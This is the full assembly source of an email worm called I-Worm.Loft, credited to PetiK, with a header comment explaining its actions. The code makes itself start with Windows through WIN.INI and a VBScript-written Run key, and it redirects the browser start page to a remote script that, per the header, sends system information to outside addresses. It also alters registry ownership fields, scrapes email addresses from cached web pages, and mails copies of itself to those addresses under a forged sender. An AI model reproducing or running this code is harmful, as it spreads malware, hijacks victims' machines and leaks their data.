; comment #
; Name : I-Worm.Loft
; Author : PetiK
; Date : June 16th - June 22nd
; Size : 8704 byte
; 
; Action : If the file is not \WINDOWS\SYSTEM\LOFT.EXE, it copies to this file and alters the run=
; line in the WIN.INI file to run in each start. It copies to \WINDOWS\LOFT_STORY.EXE too
; 
; Otherwise, it checks if exists the key HKCU\Software\Microsoft\PetiK. If not exists, the worm
; creates the file "Loft.htm" in the StartUp folder. When the user will accept the ActiveX of
; this page, It modifies the start page of Internet Explorer to download the file ActiveX.vbs.
; This file send differents information about the computer to three addresses :
; loftptk@multimania(castaldi), petik@multimania.com(vlad14) and euphoria@ctw.net(pk29a).
; 
; It displays a message all the 28th of the month and modifies the start page of internet and
; RegisteredOwner and RegisteredOrganization. It check if exist a internet connection.
; If not exist, it makes a loop all the five seconds or else it displays a message.
; It scans after all *.htm* file in the "Temporary Internet Files" to find email address.
; #
; 
; .586p
.model flat
.code

callx macro a
extrn a:proc
call a
endm

include useful.inc

DEBUT:
VERIF:  push 00h
    callx GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    callx GetModuleFileNameA

    push 50h
    push offset szCopie
        callx GetSystemDirectoryA
        @pushsz "\LOFT.EXE"
        push offset szCopie
        callx lstrcat

    push 50h
    push offset szCopieb
        callx GetWindowsDirectoryA
        @pushsz "\LOFT_STORY.EXE"
        push offset szCopieb
        callx lstrcat

    push offset szOrig
    push offset szCopie
    callx lstrcmp
    test eax,eax
        jz   C_PTK

COPIE:  push 00h
    push offset szCopie
    push offset szOrig
    callx CopyFileA
    push 00h
    push offset szCopieb
    push offset szOrig
    callx CopyFileA

WININI: push 50
    push offset szWinini
    callx GetWindowsDirectoryA
    @pushsz "\\WIN.INI"
    push offset szWinini
    callx lstrcat
    push offset szWinini
    push offset szCopie
    @pushsz "run"
    @pushsz "windows"
    callx WritePrivateProfileStringA

MESSAGE:push 1040h
    @pushsz "Loft Story"
    @pushsz "I'm fucking the Loft Story"
    push 00h
    callx MessageBoxA
    jmp  FIN

C_PTK:  push  offset regDisp
    push  offset regResu
    push  00h
    push  0F003Fh
    push  00h
    push  00h
    push  00h
    @pushsz "Software\Microsoft\PetiK"
    push  HKEY_CURRENT_USER
    callx RegCreateKeyExA
    cmp   [regDisp],2
    je    DATE
    push  [regResu]
    callx RegCloseKey   
    
STA_UP: push  offset RegHandle
    push  001F0000h ; KEY_QUERY_VALUE
    push  00h
        @pushsz ".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    push  HKEY_USERS
    callx RegOpenKeyExA
    test  eax,eax
    jnz   FIN

    push  offset BufferSize
    push  offset Buffer
    push  00h           ;ValueType
    push  00h
    @pushsz "Startup"
    push  RegHandle
    callx RegQueryValueExA

    push  [RegHandle]
    callx RegCloseKey

CR_HTM: @pushsz "\Loft.htm"
    push  offset Buffer
    call lstrcat
    push  00h
    push  FILE_ATTRIBUTE_NORMAL
    push  CREATE_ALWAYS
    push  00h
    push  FILE_SHARE_READ
    push  GENERIC_WRITE
        push  offset Buffer
    callx CreateFileA
    mov   [FileHandle],eax
    push  00h
    push  offset octets
    push  HTMTAILLE
    push  offset htmd
    push  [FileHandle]
    callx WriteFile
    push  [FileHandle]
    callx CloseHandle
    jmp   DLL

DATE:   push  offset SystemTime
    callx GetSystemTime
    cmp   [SystemTime.wDay],28
    jne   DLL
SHSET:  @pushsz "SHLWAPI.dll"
    callx LoadLibraryA
    test  eax,eax
    jz    DLL
    mov   hdll2,eax
    @pushsz "SHSetValueA"
    push  hdll2
    callx GetProcAddress
    test  eax,eax
    jz    DLL
    mov   setvalue,eax
WEB:    push  08h
    @pushsz "http://www.loftstory.fr"
    push  01h
    @pushsz "Start Page"
    @pushsz "Software\Microsoft\Internet Explorer\Main"
    push  HKEY_CURRENT_USER
    call  [setvalue]
    push  08h
    @pushsz "LoftStory"
    push  01h
    @pushsz "RegisteredOrganization"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push  HKEY_LOCAL_MACHINE
    call  [setvalue]
    push  08h
    @pushsz "Aziz, Kenza, Loanna, etc..."
    push  01h
    @pushsz "RegisteredOwner"
    @pushsz "Software\Microsoft\Windows\CurrentVersion"
    push  HKEY_LOCAL_MACHINE
    call  [setvalue]
    push  [hdll2]
    callx FreeLibrary
    push  40h
    @pushsz "I-Worm.LoftStory"
    @pushsz "New Worm Internet coded by PetiK (c)2001"
    push  00h
    callx MessageBoxA

DLL:    @pushsz "WININET.dll"
    callx LoadLibraryA
    test  eax,eax
    jz    FIN
    mov   hdll,eax
    @pushsz "InternetGetConnectedState"
    push  hdll
    callx GetProcAddress
    test  eax,eax
    jz    FIN
    mov   netcheck,eax
    jmp   NET
DODO:   push  5000
    callx Sleep
NET:    push  00h
    push  offset Temp
    call  [netcheck]
    dec   eax
    jnz   DODO

NET_OK: push  40h
    @pushsz "Loft Story"
    @pushsz "Welcome to Internet !"
    push  00h
    callx MessageBoxA
FINDLL: push  [hdll]
    callx FreeLibrary

REG:    push  offset RegHandle
    push  001F0000h ; KEY_QUERY_VALUE
    push  00h
        @pushsz ".DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
    push  HKEY_USERS
    callx RegOpenKeyExA
    test  eax,eax
    jnz   FIN

    push  offset BufferSize
    push  offset Buffer
    push  00h           ;ValueType
    push  00h
    @pushsz "Cache"
    push  RegHandle
    callx RegQueryValueExA

    push  [RegHandle]
    callx RegCloseKey

TIF_CUR:push   offset Buffer
    callx  SetCurrentDirectoryA
    call  FFF

FIN:    push  00h
    callx ExitProcess

FFF:    push  offset HTM
    @pushsz "*.htm*"
    callx FindFirstFileA
    mov   edi,eax
    cmp   eax,-1
    je    FIN
P_HTM:  call  parse_html
FNF:    push  offset HTM
    push  edi
        callx FindNextFileA
    test  eax,eax
    jnz   P_HTM
FC: push  edi
    callx FindClose
    ret


parse_html:
    pushad
    push    00h
    push    FILE_ATTRIBUTE_NORMAL
    push    OPEN_EXISTING
    push    00h
    push    FILE_SHARE_READ
    push    GENERIC_READ
    push    offset HTM.FileName
    callx   CreateFileA             ;open the file
    inc eax
    je  FIN
    dec eax
    xchg    eax,ebx

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    PAGE_READONLY
    push    eax
    push    ebx
    callx   CreateFileMappingA          ;create the file mapping
    test    eax,eax
    je  ph_close
    xchg    eax,ebp

    xor eax,eax
    push    eax
    push    eax
    push    eax
    push    FILE_MAP_READ
    push    ebp
    callx   MapViewOfFile               ;map the file
    test    eax,eax
    je  ph_close2
    xchg    eax,esi

    push    00h
    push    ebx
    callx   GetFileSize             ;get its size
    xchg    eax,ecx
    jecxz   ph_close3

ls_scan_mail:
    call    @mt
    db  'mailto:'
@mt:    pop edi
l_scan_mail:
    pushad
    push    7
    pop ecx
    rep
    cmpsb                       ;search for "mailto:"
    popad                       ;string
    je  scan_mail               ;check the mail address
    inc esi
    loop    l_scan_mail             ;in a loop

ph_close3:
    push    esi
    callx   UnmapViewOfFile             ;unmap view of file
ph_close2:
    push    ebp
    callx   CloseHandle             ;close file mapping
ph_close:
    push    ebx
    callx   CloseHandle             ;close the file
    popad
    ret

scan_mail:
    xor edx,edx
    add esi,7
    mov edi,offset mail_address         ;where to store the
    push    edi                 ;mail address
n_char: lodsb
    cmp al,' '
    je  s_char
    cmp al,'"'
    je  e_char
    cmp al,''''
    je  e_char
    cmp al,'@'
    jne o_a
    inc edx
o_a:    stosb
    jmp n_char
s_char: inc esi
    jmp n_char
e_char: xor al,al
    stosb
    pop edi
    test    edx,edx                 ;if EDX=0, mail is not
    je  ls_scan_mail                ;valid (no '@')

    call    mapi_init
    test    eax,eax
    jne     ls_scan_mail
    call    send
    call    close

    jmp ls_scan_mail

mapi_init:
    xor   eax,eax
    push  offset MAPIHandle
    push  eax
    push  eax
    push  eax
    push  eax
    push  eax
    callx MAPILogon
    ret

send:   xor   eax,eax
    push  eax
    push  eax
    push  offset sMessage 
    push  eax
    push  [MAPIHandle]
    callx MAPISendMail
    ret

close:  xor   eax,eax
    push  eax
    push  eax
    push  eax
    push  12345678h
    MAPIHandle = dword ptr $-4
    callx MAPILogoff
    ret

add_ad: ;@pushsz "C:\carnet.txt"
    ;push offset mail_address
    ;push offset mail_address
    ;@pushsz "Carnet d'adresses"
    ;callx WritePrivateProfileStringA
    ret
    
.data
htmd:   db '<html><head><title>Loft Story WEB Page</title></head>',0dh,0ah
    db '<font face=''verdana'' color=green size=''2''>Please accept ActiveX '
    db 'to see this page<br><br>    Internet Explorer<br><br> </font>',0dh,0ah
    db '<SCRIPT Language=VBScript>',0dh,0ah
    db 'On Error Resume Next',0dh,0ah
    db 'Set w=CreateObject("WScript.Shell")',0dh,0ah
    db 'w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ActiveX 1.0",'
    db '"C:\ActiveX.vbs"',0dh,0ah
    db 'w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Download Directory",'
    db '"C:\"',0dh,0ah
    db 'document.write "Please download the file ""ActiveX.vbs"" to correct a bug '
    db 'in Internet Explorer"',0dh,0ah
    db 'document.write "<br>Connect you to internet to download the file<br>"',0dh,0ah
    db 'document.write "<br><h2>If you don''t accept ActiveX the syntax failed<h2>"',0dh,0ah
    db 'w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",'
    db '"http://www.ctw.net/euphoria/ActiveX.vbs"',0dh,0ah
    db '</SCRIPT></body></html>',0dh,0ah
HTMTAILLE   equ $-htmd

szCopie     db 50 dup (0)
szCopieb    db 50 dup (0)
szOrig      db 50 dup (0)
szWinini    db 50 dup (0)
Buffer      db 7Fh dup (0)
BufferSize  dd 7Fh
FileHandle  dd ?
RegHandle   dd ?
regDisp     dd 0
regResu     dd 0
octets      dd ?
hdll        dd ?
hdll2       dd ?
netcheck    dd ?
setvalue    dd ?
mail_address    db 128 dup (?)
Temp        dd 0
ValueType   dd 0

sMessage    dd ?
        dd offset subject
        dd offset body
        dd ?
        dd offset date
        dd ?
        dd 2
        dd offset mFrom
        dd 1
        dd offset mTo
        dd 1
        dd offset attach

subject     db "Loft Story News...",00h
body        db "The last video of the <Loft story> program",00h
date        db "07/01/2001",00h
sender      db "b_castaldi@loftstory.fr",00h

mFrom       dd ?
        dd ?
        dd offset mFrom
        dd offset sender
        dd ?
        dd ?

mTo     dd ?
        dd 1
        dd offset mTo
        dd offset mail_address
        dd ?
        dd ?

attach      dd ?
        dd ?
        dd ?
        dd offset szCopieb
        dd ?
        dd ?        


CREATE_ALWAYS       equ 00000002h
FILE_ATTRIBUTE_NORMAL   equ 00000080h
FILE_END        equ 00000002h
FILE_MAP_READ       equ 00000004h
FILE_SHARE_READ     equ 00000001h
GENERIC_READ        equ 80000000h
GENERIC_WRITE           equ 40000000h
HKEY_CURRENT_USER   equ 80000001h
HKEY_LOCAL_MACHINE  equ 80000002h
HKEY_USERS      equ 80000003h
OPEN_EXISTING       equ 00000003h
PAGE_READONLY       equ 00000002h

SYSTIME struct
wYear       WORD ?
wMonth      WORD ?
wDayOfWeek  WORD ?
wDay        WORD ?
wHour       WORD ?
wMinute     WORD ?
wSecond     WORD ?
wMillisecond    WORD ?
SYSTIME ends
SystemTime      SYSTIME <>

filetime    struct
LowDateTime dd ?
HighDateTime    dd ?
filetime    ends
win32       struct
Fileattributes  dd ?
CreationTime    filetime ?
LastAccessTime  filetime ?
LastWriteTime   filetime ?
FileSizeHigh    dd ?
FileSizeHow dd ?
Reserved0   dd ?
Reserved1   dd ?
FileName    dd 260 (?)
AlternativeName db 13 dup (?)
        db  3 dup (?)
win32       ends
HTM win32 <>


end DEBUT
end
